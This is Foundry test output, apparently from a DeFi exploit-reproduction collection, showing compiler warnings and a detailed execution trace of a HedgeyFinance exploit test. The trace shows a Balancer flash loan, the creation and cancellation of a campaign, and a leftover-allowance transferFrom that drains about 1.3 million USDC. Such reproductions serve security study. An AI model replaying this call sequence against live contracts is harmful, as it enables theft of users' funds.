Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-04/HedgeyFinance_exp.sol:70:5:
   |
70 |     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-04/HedgeyFinance_exp.sol:73:5:
   |
73 |     IClaimCampaigns private constant HedgeyFinance = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
  --> src/test/2024-04/HedgeyFinance_exp.sol:66:1:
   |
66 | contract HedgeyFinance is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 267.12ms (249.18µs CPU time)

Ran 1 test for src/test/2024-04/HedgeyFinance_exp.sol:HedgeyFinance
[PASS] testExploit() (gas: 329712)
Logs:
  Attacker USDC balance before exploit: 0.000000000000000000
  Attacker USDC balance after exploit: 1303910.120000

Traces:
  [417406] HedgeyFinance::testExploit()
    ├─ [0] VM::deal(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker USDC balance before exploit", val: 0, decimals: 18)
    ├─ [367009] BalancerVault::flashLoan(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], [1305000000000 [1.305e12]], 0x)
    │   ├─ [9839] USDC::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 9617246330732 [9.617e12]
    │   │   └─ ← [Return] 9617246330732 [9.617e12]
    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [32152] USDC::transfer(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12])
    │   │   ├─ [31363] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1305000000000 [1.305e12])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [300900] HedgeyFinance::receiveFlashLoan([0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], [1305000000000 [1.305e12]], [0], 0x)
    │   │   ├─ [25462] USDC::approve(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, 1305000000000 [1.305e12])
    │   │   │   ├─ [24673] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::approve(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   │   ├─ emit Approval(owner: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, value: 1305000000000 [1.305e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [225161] 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511::createLockedCampaign(0x00000000000000000000000000000001, Campaign({ manager: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, amount: 1305000000000 [1.305e12], end: 3133666800 [3.133e9], tokenLockup: 1, root: 0x0000000000000000000000000000000000000000000000000000000000000000 }), ClaimLockup({ tokenLocker: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, start: 0, cliff: 0, period: 0, periods: 0 }), Donation({ tokenLocker: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amount: 0, rate: 0, start: 0, cliff: 0, period: 0 }))
    │   │   │   ├─ [3339] USDC::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [staticcall]
    │   │   │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1303910120000 [1.303e12]
    │   │   │   │   └─ ← [Return] 1303910120000 [1.303e12]
    │   │   │   ├─ [1339] USDC::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1305000000000 [1.305e12]
    │   │   │   │   └─ ← [Return] 1305000000000 [1.305e12]
    │   │   │   ├─ [9349] USDC::transferFrom(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, 1305000000000 [1.305e12])
    │   │   │   │   ├─ [8554] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, value: 1305000000000 [1.305e12])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 2608910120000 [2.608e12]
    │   │   │   │   └─ ← [Return] 2608910120000 [2.608e12]
    │   │   │   ├─ [3448] USDC::allowance(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   ├─ [2659] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::allowance(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [23362] USDC::approve(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12])
    │   │   │   │   ├─ [22573] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::approve(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, spender: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1305000000000 [1.305e12])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─  emit topic 0: 0xce04f3b9b2dfc43b1d1e78376db74a3b32c0a78daaf34efc81334908359448fc
    │   │   │   │        topic 1: 0x0000000000000000000000000000000100000000000000000000000000000000
    │   │   │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0x08e5218da97ab939144e67510d646e499712fb36e2305d6dffdf06b7447e48f9
    │   │   │   │        topic 1: 0x0000000000000000000000000000000100000000000000000000000000000000
    │   │   │   │           data: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000012fd80fba0000000000000000000000000000000000000000000000000000000000bac7f5f000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 
    │   │   ├─ [37115] 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511::cancelCampaign(0x00000000000000000000000000000001)
    │   │   │   ├─ [1339] USDC::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [25352] USDC::transfer(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12])
    │   │   │   │   ├─ [24563] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, to: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1305000000000 [1.305e12])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1305000000000 [1.305e12]
    │   │   │   │   └─ ← [Return] 1305000000000 [1.305e12]
    │   │   │   ├─ emit CampaignCancelled(param0: 0x00000000000000000000000000000001)
    │   │   │   └─ ← [Return] 
    │   │   ├─ [5452] USDC::transfer(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1305000000000 [1.305e12])
    │   │   │   ├─ [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1305000000000 [1.305e12]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 1305000000000 [1.305e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [1339] USDC::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 9617246330732 [9.617e12]
    │   │   └─ ← [Return] 9617246330732 [9.617e12]
    │   ├─ emit FlashLoan(param0: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], param2: 1305000000000 [1.305e12], param3: 0)
    │   └─ ← [Stop] 
    ├─ [1339] USDC::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) [delegatecall]
    │   │   └─ ← [Return] 1303910120000 [1.303e12]
    │   └─ ← [Return] 1303910120000 [1.303e12]
    ├─ [29249] USDC::transferFrom(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1303910120000 [1.303e12])
    │   ├─ [28454] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1303910120000 [1.303e12]) [delegatecall]
    │   │   ├─ emit Transfer(from: 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511, to: HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1303910120000 [1.303e12])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1339] USDC::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(HedgeyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 1303910120000 [1.303e12]
    │   └─ ← [Return] 1303910120000 [1.303e12]
    ├─ [3164] USDC::decimals() [staticcall]
    │   ├─ [2381] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker USDC balance after exploit", val: 1303910120000 [1.303e12], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.20s (1.55s CPU time)

Ran 2 test suites in 2.47s (2.47s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
